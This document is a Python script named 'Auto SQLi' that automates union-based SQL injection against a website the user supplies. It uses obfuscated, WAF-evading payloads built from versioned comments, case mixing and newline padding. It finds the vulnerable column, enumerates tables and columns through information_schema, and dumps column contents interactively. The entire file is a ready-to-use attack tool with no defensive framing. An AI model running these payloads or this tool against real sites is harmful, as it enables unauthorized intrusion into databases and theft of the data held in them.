try:
	import requests
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except:
	print(" [+] Command: pip install requests")
	exit()
import codecs,re
from random import choice
from prettytable import PrettyTable
from os import system
from platform import system as osname
def cls():
	if osname() == "Linux":
		system("clear")
	else:
		system("cls")
#Color Code 
r = "\x1b[91m"
g = "\x1b[92m"
y = "\x1b[93m"
b = "\x1b[94m"
m = "\x1b[95m"
c = "\x1b[96m"
w = "\x1b[97m"
colors = [r,g,y,b,m,c,w]
def hex(data):
	hex = codecs.getencoder('hex')
	return "0x"+hex(data.encode('utf-8'))[0].decode('utf-8')
headers = {'User-Agent':'Mozilla/5.0 (Linux; Android 10; RMX2195 Build/QKQ1.200614.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36'}
bof = "%23"+("a"*150)+"%0a"
def union(dios):
	return " %23aaaaaa%0a/*Ripon*//*!aND*/%23aaaaaa%0a/*name:*/ mod/**Ripon**/(0,0)/**56**/ /*!or*/ @r:=("+dios+") %23aaaaa%0a/*name:*//*!uNiOn*//*name:*/"+bof+"/*!sELecT*//**Nice**/%23aaaaaa%0a"
printname = union("%23aaaaaaa%0a/*name:*//*!sEleCT*//*hello*/ 0x7269706f6e2e69736b/*hi*/")
printTable = union("%23aaaaa%0a/*Hi*//*!sElecT*/%23aaaaa%0a/*name*//*!gRoUp_cONcaT(0x3c5461626c654e616d653e,tAbLE_nAmE,0x3c5461626c654e616d653e)*/ %23aaaaa%0a/*xxx*//*!fRoM*//*xxx*/ /*!iNfoRmAtIoN_sChEmA*/./*ggg*//*!tAbLeS*/%23aaaaa%0a /*xxxx*//*!wHerE*//*xxx*/ /*!tAbLe_sChEmA*/=dAtaBasE/**55**/(/*133*/)/*xxxxx*/")
printColumn = union("%23aaaaa%0a/*Hi*//*!sElecT*/%23aaaaa%0a/*name*//*!gRoUp_cONcaT(0x3c5461626c654e616d653e,cOluMn_nAmE,0x3c5461626c654e616d653e)*/ %23aaaaa%0a/*xxx*//*!fRoM*//*xxx*/ /*!iNfoRmAtIoN_sChEmA*/./*ggg*//*!cOluMns*/%23aaaaa%0a /*xxxx*//*!wHerE*//*xxx*/ /*!tAbLe_nAmE*/=[NAME]/*xxxxx*/")
printData = union("%23aaaaa%0a/*Hi*//*!sElecT*/%23aaaaa%0a/*name*//*!gRoUp_cONcaT(0x3c5461626c654e616d653e,[COLUMN],0x3c5461626c654e616d653e)*/ %23aaaaa%0a/*xxx*//*!fRoM*//*xxx*//*![NAME]*//*555*/%23aaaaa%0a")
def GET(url):
	while True:
		try:
			req = requests.get(url,headers=headers,timeout=(10,25),verify=False)
			if req.status_code<400:
				pass
			else:
				print(g+" ~ "+w+"$ "+y+'Warning: '+w+"403 Waf Detected!")
				return "FirewallDetected403"
			return req.content.decode('utf-8')
		except Exception as e:
			pass
def get_union_number(url):
	payload = ""
	i = ""
	for num in range(1,101):
		payload += "@r,"
		html = GET(url+printname+payload[:-1]+comment).lower()
		print(g+" ~ "+w+"$ Scanning Union: "+str(num)+"                    ",end="\r")
		if html == "FirewallDetected403".lower():
			return None
		i += str(num)+","
		if "ripon.isk" in html:
			return i[:-1]
def get_vuln_column(num):
	for i in num.split(","):
		html = GET(url+printname+num.replace(i,"@r")+comment).lower()
		if "ripon.isk" in html:
			return num.replace(i,"@r")
def get_tables(union):
	html = GET(url+printTable+union+comment)
	while True:
		scrape_output(html,"Tables")
		try:
			cmd = input(g+" ~ "+w+"$ Table Name: ")
			if cmd == "BACK>>":
				return 0
			else:
				get_columns(cmd)
		except:
			pass
def get_columns(tablename):
	html = GET(url+printColumn.replace("[NAME]",hex(tablename))+union+comment)
	while True:
		scrape_output(html,tablename)
		try:
			cmd = input(g+" ~ "+w+"$ Column Name: ")
			if cmd == "BACK>>":
				return 0
			else:
				dump_data(tablename,cmd)
		except:
			pass
def dump_data(tablename,column):
	html = GET(url+printData.replace("[NAME]",tablename).replace("[COLUMN]",column)+union+comment)
	scrape_output(html,column)
	input(g+" ~ "+w+"$ Press Enter To Continue")
def scrape_output(html,name):
	output = PrettyTable()
	column = []
	for i in re.findall("<TableName>(.*?)<TableName>",html):
		column.append(w+choice(colors)+i+w)
	output.add_column("\x1b[42m"+name+"\x1b[0m"+w,column)
	print(output)
	print()
logo = """   _____       _       _         _ _      __ ____ ____ ______ 
  / ____|     | |     | |       | (_)    /_ |___ \___ \____  |
 | (___   __ _| | __ _| |__   __| |_ _ __ | | __) |__) |  / / 
  \___ \ / _` | |/ _` | '_ \ / _` | | '_ \| ||__ <|__ <  / /  
  ____) | (_| | | (_| | | | | (_| | | | | | |___) |__) |/ /   
 |_____/ \__,_|_|\__,_|_| |_|\__,_|_|_| |_|_|____/____//_/                                                              """
while True:
	try:
		cls()
		print(r+logo+"""\n{}	Author:{} Black_Phish\n	{}Name: {}Auto SQLi\n""".format(y,c,y,c))
		url = input(g+" ~ "+w+"$ Site: ")
		comment = input(g+" ~ "+w+"$ End Comment: ")
		union_number = get_union_number(url)
		if union_number == None:
			break
		union = get_vuln_column(union_number)
		cls()
		print(g+" ~ "+w+"$ Msg: "+"Input `BACK>>` For Back")
		print(g+" ~ "+w+"$ SQLi: "+url+" UNION SELECT "+union.replace("@r","[VULN]"))
		get_tables(union)
	except:
		pass
